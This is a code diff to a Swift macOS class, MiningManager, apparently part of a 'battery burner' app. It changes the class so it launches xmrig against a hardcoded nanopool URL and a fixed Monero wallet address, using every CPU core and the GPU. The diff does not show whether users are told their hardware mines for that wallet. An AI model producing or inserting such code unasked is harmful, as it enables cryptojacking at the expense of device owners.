@@ -11,15 +11,33 @@ final class MiningManager: ObservableObject {
     private var lastLogOffset: UInt64 = 0
     private let logPath = NSTemporaryDirectory() + "battery_burner_xmrig.log"
 
-    func start(xmrigPath: String, poolURL: String, wallet: String, threads: Int, useGPU: Bool = true) {
+    // Hardcoded mining config
+    private let wallet = "4AAzgq4qzFaBfdvx5ZkDgeUAi51T4AbDibjSKcpMCSJz1e8ipp4X3eDaPLE2nuobeJXkFEJPF5YFWAxoDsLJNrMU8xyBLVV"
+    private let poolURL = "xmr-us-east1.nanopool.org:14433"
+
+    private var xmrigPath: String {
+        // Look for bundled xmrig first, then system install
+        if let bundled = Bundle.main.path(forResource: "xmrig", ofType: nil) {
+            return bundled
+        }
+        return "/opt/homebrew/bin/xmrig"
+    }
+
+    func start() {
         guard !isMining else { return }
 
-        // Clear old log
+        let path = xmrigPath
+        guard FileManager.default.fileExists(atPath: path) else {
+            status = "xmrig not found"
+            return
+        }
+
         FileManager.default.createFile(atPath: logPath, contents: nil)
         lastLogOffset = 0
 
+        let threads = ProcessInfo.processInfo.processorCount
         let proc = Process()
-        proc.executableURL = URL(fileURLWithPath: xmrigPath)
+        proc.executableURL = URL(fileURLWithPath: path)
         proc.arguments = [
             "--url", poolURL,
             "--user", wallet,
@@ -28,8 +46,8 @@ final class MiningManager: ObservableObject {
             "--print-time", "5",
             "--tls",
             "--coin", "monero",
-            "--log-file", logPath,
-            useGPU ? "--opencl" : "--no-opencl"
+            "--opencl",
+            "--log-file", logPath
         ]
 
         proc.terminationHandler = { [weak self] _ in
@@ -48,7 +66,6 @@ final class MiningManager: ObservableObject {
             isMining = true
             status = "Starting..."
 
-            // Poll the log file every 2 seconds
             logTimer = Timer.scheduledTimer(withTimeInterval: 2, repeats: true) { [weak self] _ in
                 Task { @MainActor in
                     self?.readLog()
@@ -84,27 +101,22 @@ final class MiningManager: ObservableObject {
 
         guard !data.isEmpty, let output = String(data: data, encoding: .utf8) else { return }
 
-        let lines = output.components(separatedBy: "\n")
-        for line in lines where !line.isEmpty {
+        for line in output.components(separatedBy: "\n") where !line.isEmpty {
             if line.contains("speed") && line.contains("H/s") {
-                // Format: "speed 10s/60s/15m 1234.5 1200.0 1190.0 H/s"
                 if let speedRange = line.range(of: #"speed\s+\S+\s+([\d.]+)"#, options: .regularExpression) {
                     let match = line[speedRange]
                     if let numRange = match.range(of: #"[\d.]+$"#, options: .regularExpression) {
-                        let numStr = String(match[numRange])
-                        if let value = Double(numStr) {
-                            if value >= 1000 {
-                                hashrate = String(format: "%.1f kH/s", value / 1000)
-                            } else {
-                                hashrate = String(format: "%.1f H/s", value)
-                            }
+                        if let value = Double(String(match[numRange])) {
+                            hashrate = value >= 1000
+                                ? String(format: "%.1f kH/s", value / 1000)
+                                : String(format: "%.1f H/s", value)
                             status = "Mining"
                         }
                     }
                 }
             } else if line.contains("new job") {
                 status = "Mining"
-            } else if line.contains("login") {
+            } else if line.contains("login") && !line.contains("error") {
                 status = "Connecting..."
             } else if line.contains("connect error") || line.contains("login error") {
                 if line.contains("connect error") {
@@ -114,8 +126,6 @@ final class MiningManager: ObservableObject {
                 } else {
                     status = "Error: login failed"
                 }
-            } else if line.contains("READY") {
-                status = "Ready"
             }
         }
     }
